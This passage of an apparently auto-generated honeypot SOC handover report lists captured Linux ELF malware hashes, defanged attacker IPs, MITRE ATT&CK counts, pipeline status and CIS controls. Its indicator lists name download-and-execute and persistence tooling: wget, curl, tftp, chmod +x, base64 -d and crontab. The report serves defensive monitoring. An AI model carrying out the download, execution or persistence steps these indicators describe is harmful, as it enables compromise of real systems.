| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.131[.]63` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `47.88.0[.]49` | US | Alibaba Cloud - US | **100** ⚠️ | 8 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `163.192.48[.]255` | US | Oracle Corporation | **100** ⚠️ | 14 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `35.130.111[.]146` | US | Charter Communications LLC | **100** ⚠️ | 50 |
| `218.4.156[.]254` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `2.55.70[.]124` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `196.189.59[.]226` | ET | To__BRAS_DHCP_AD_10800E | **100** ⚠️ | 50 |
| `103.120.116[.]162` | PK | Broadband Business Ideas (PVT.) Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 40 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 32 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 82 cases |
| Tool 34  | Credential Extractor        | ✅ 49 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 61 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (14.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 47 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 32 priority case(s) shown individually · 25 recon entry/entries in table (8 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-01T20:59:09Z_
